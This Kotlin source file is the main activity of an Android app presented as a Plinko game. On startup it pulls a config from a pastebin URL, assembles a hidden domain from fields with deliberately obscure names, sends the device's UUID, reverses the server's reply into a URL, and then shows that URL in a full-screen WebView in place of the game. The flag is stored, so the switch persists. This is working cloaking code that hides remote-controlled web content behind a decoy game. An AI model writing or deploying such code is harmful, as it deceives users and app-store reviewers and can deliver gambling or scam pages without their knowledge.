package togle.plinko.mega.sigma.dominicanos

import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import android.webkit.WebChromeClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.findNavController
import com.badlogic.gdx.Gdx
import com.badlogic.gdx.Input
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import org.json.JSONObject
import togle.plinko.mega.sigma.dominicanos.bebView.BebViewController
import togle.plinko.mega.sigma.dominicanos.bebView.BebViewChromeClient
import togle.plinko.mega.sigma.dominicanos.databinding.ActivityMainBinding
import togle.plinko.mega.sigma.dominicanos.game.LibGDXFragment
import togle.plinko.mega.sigma.dominicanos.game.LibGDXGame
import togle.plinko.mega.sigma.dominicanos.game.manager.NavigationManager
import togle.plinko.mega.sigma.dominicanos.game.screens.menuScreen
import togle.plinko.mega.sigma.dominicanos.utils.*
import togle.plinko.mega.sigma.dominicanos.utils.NetworkUtil.haveNetworkConnection
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {

        @SuppressLint("StaticFieldLeak")
        lateinit var binding: ActivityMainBinding

        val bebView by lazy { binding.webView }
        val lottie by lazy { Lottie(binding) }

        val isBebViewVisibleFlow = MutableStateFlow<Boolean?>(null)

        private var isZachemu = false

        var kakayatoDom = ""
            private set
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (haveNetworkConnection(this).not()) lottie.showNotNetwork()
        else {
            lottie.showLoader()

            BebViewController(this@MainActivity, bebView).initialize()
            checkDataStore()

            coroutine.launch(Dispatchers.Main) {
                isBebViewVisibleFlow.collect { it?.let { isBebViewVisible ->
                    lottie.hideLoader()
                    requestedOrientation = if (isBebViewVisible) {
                        bebView.visibility = View.VISIBLE
                        window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                        ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    } else {
                        bebView.visibility = View.GONE
                        window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                        ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                    }
                    binding.gameContainer.visibility = View.VISIBLE
                } }
            }
        }
    }

    override fun onResume() {
        bebView.onResume()
        super.onResume()
    }

    override fun onPause() {
        bebView.onPause()
        super.onPause()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == BebViewChromeClient.REQUEST_SELECT_FILE) {
            if (BebViewChromeClient.uploadMessage == null) return
            BebViewChromeClient.uploadMessage!!.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data))
            BebViewChromeClient.uploadMessage = null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onBackPressed() {
        if (bebView.canGoBack()) bebView.goBack() else menuScreen.keyDown(Input.Keys.BACK)
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    log("DataStoreManager Key = Good")
                    DataStoreManager.Link.get()?.let {
                        BebViewController.bebUrlFlow.value = it
                        isBebViewVisibleFlow.value = true
                    }
                }
                "Bad" -> {
                    log("DataStoreManager Key = Bad")
                    isBebViewVisibleFlow.value = false
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getConfig()
                    if (isZachemu) getData() else isBebViewVisibleFlow.value = false
                }
            }
        }
    }

    private suspend fun getConfig() {
        try {
            NetworkUtil.Network.service.getDataByUrl("https://pastebin.com/raw/F555J3BV").body()?.string()?.let { response ->
                try {
                    JSONObject(response).also { json ->
                        isZachemu   = json.getBoolean("zachemu")
                        kakayatoDom = (
                                json.getString("patamukta") +
                                json.getString("kogda") +
                                json.getString("de") +
                                json.getString("vontam") +
                                json.getString("ono")
                        )
                        log("config = ($isZachemu) | [$kakayatoDom]")
                    }
                } catch (e: Exception) { logAndGame(e) }
            }
        } catch (e: Exception) { logAndGame(e) }
    }

    private suspend fun getData() {
        try {
            NetworkUtil.Network.service.getData(upid = DataStoreManager.UUID.get()).also { response ->
                val bebUrl = response.body()?.string()?.reversed() ?: ""

                log("response - $response")
                log("code - ${response.code()}")
                log("body - $bebUrl")
                when(response.code()) {
                    200 -> {
                        DataStoreManager.Key.update { "Good" }
                        DataStoreManager.Link.update { bebUrl }
                        BebViewController.bebUrlFlow.value = bebUrl
                        isBebViewVisibleFlow.value = true
                    }
                    400 -> {
                        DataStoreManager.Key.update { "Bad" }
                        isBebViewVisibleFlow.value = false
                    }
                }
            }
        } catch (e: Exception) { logAndGame(e) }
    }


    private fun logAndGame(e: Exception) {
        log(e.message ?: "EXCEPTION")
        isZachemu                  = false
        isBebViewVisibleFlow.value = false
    }

}